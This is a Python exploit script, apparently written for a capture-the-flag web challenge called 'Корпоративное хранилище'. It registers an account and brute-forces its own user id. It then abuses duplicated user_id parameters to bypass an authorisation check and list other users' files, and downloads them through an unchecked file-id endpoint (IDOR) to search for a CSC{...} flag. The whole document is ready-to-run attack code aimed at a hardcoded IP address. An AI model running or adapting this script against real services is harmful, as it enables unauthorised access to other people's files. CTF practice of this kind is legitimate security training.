
#!/usr/bin/env python3
# Exploit for "Корпоративное хранилище" (Medium)
# Idea:
#  - /api/files reads repeated ?user_id=... parameters with a broken check:
#       * auth check compares LAST user_id to the session's user_id
#       * target user whose files are listed is taken from ANOTHER place (likely the FIRST param)
#    => we can pass ?user_id=<victim>&user_id=<me> to bypass the check and list victim files.
#  - /file/<file_id> lets you download by file_id without checking owner (IDOR).
#
# This script:
#   1) Registers & logs in a random user
#   2) Discovers our own user_id by probing /api/files with ?user_id=0&user_id=<guess>
#   3) Tries to list files for likely victim ids (1..10) using ?user_id=<victim>&user_id=<me>
#   4) Downloads each file via /file/<file_id> and searches for CSC{...}
#   5) Prints the first found flag and exits with code 0; otherwise shows findings.
#
# Usage:
#   python3 corpfiles_exploit.py --base http://62.173.139.193:16003 --verbose
#
import argparse, os, re, secrets, string, sys, time
import requests
from bs4 import BeautifulSoup

def randid(n=6):
    return ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def register_and_login(session: requests.Session, base: str, username=None, password=None, verbose=False):
    username = username or f"user_{randid()}"
    password = password or f"pass_{randid()}"
    # Register
    r = session.post(f"{base}/register", data={"username": username, "password": password}, allow_redirects=True, timeout=10)
    if verbose:
        print(f"[+] Register status: {r.status_code}")
    # Login
    r = session.post(f"{base}/login", data={"username": username, "password": password}, allow_redirects=True, timeout=10)
    if verbose:
        print(f"[+] Login status: {r.status_code}")
    if r.status_code != 200 and r.status_code != 302:
        raise RuntimeError("Login failed")
    return username, password

def discover_my_user_id(session: requests.Session, base: str, guess_max=50, verbose=False):
    # We exploit the check that compares LAST user_id to the session's user_id.
    # For guesses g=1..N, request /api/files?user_id=0&user_id=g.
    # When g == my_user_id, the "check" passes => HTTP != 403.
    for g in range(1, guess_max+1):
        u = f"{base}/api/files?user_id=0&user_id={g}"
        r = session.get(u, timeout=10)
        if verbose:
            print(f"[?] Probe my-id guess {g}: {r.status_code}")
        if r.status_code != 403:
            return g
    return None

def list_files_of(session: requests.Session, base: str, victim_id: int, my_id: int, verbose=False):
    u = f"{base}/api/files?user_id={victim_id}&user_id={my_id}"
    r = session.get(u, timeout=10)
    if verbose:
        print(f"[+] List files for victim {victim_id} (my_id={my_id}) -> {r.status_code}")
        if r.headers.get("Content-Type","").startswith("application/json"):
            print(r.json())
    if r.status_code == 200 and r.headers.get("Content-Type","").startswith("application/json"):
        try:
            js = r.json()
            return js.get("files", [])
        except Exception:
            return []
    return []

def try_download_and_find_flag(session: requests.Session, base: str, file_id: str, verbose=False):
    u = f"{base}/file/{file_id}"
    r = session.get(u, timeout=15)
    if verbose:
        print(f"[+] Download {file_id}: {r.status_code} ({len(r.content)} bytes)")
    if r.status_code == 200:
        m = re.search(rb"CSC\{[^}]{0,200}\}", r.content)
        if m:
            return m.group(0).decode("utf-8", "ignore")
    return None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="Base URL, e.g. http://62.173.139.193:16003")
    ap.add_argument("--victim-max", type=int, default=10, help="Try victim ids from 1..N (default 10)")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    base = args.base.rstrip("/")
    s = requests.Session()

    # 1) Register & login
    register_and_login(s, base, verbose=args.verbose)

    # 2) Discover my user id
    my_id = discover_my_user_id(s, base, guess_max=100, verbose=args.verbose)
    if my_id is None:
        print("[-] Could not infer my user_id (the parameter confusion check didn't behave as expected).", file=sys.stderr)
        sys.exit(2)
    if args.verbose:
        print(f"[+] My inferred user_id: {my_id}")

    # 3) Enumerate likely victims (e.g., admin=1)
    for victim in range(1, args.victim_max+1):
        if victim == my_id:
            continue
        files = list_files_of(s, base, victim, my_id, verbose=args.verbose)
        if not files:
            continue
        if args.verbose:
            print(f"[+] Victim {victim} has {len(files)} file(s).")
        # 4) Try to download each and find flag
        for item in files:
            fid = item.get("file_id") or item.get("id") or ""
            if not fid:
                continue
            flag = try_download_and_find_flag(s, base, fid, verbose=args.verbose)
            if flag:
                print(flag)
                return
    print("[-] No flag found. Maybe different victim id range; try --victim-max 50 or inspect JSON output with --verbose.", file=sys.stderr)
    sys.exit(1)

if __name__ == "__main__":
    main()
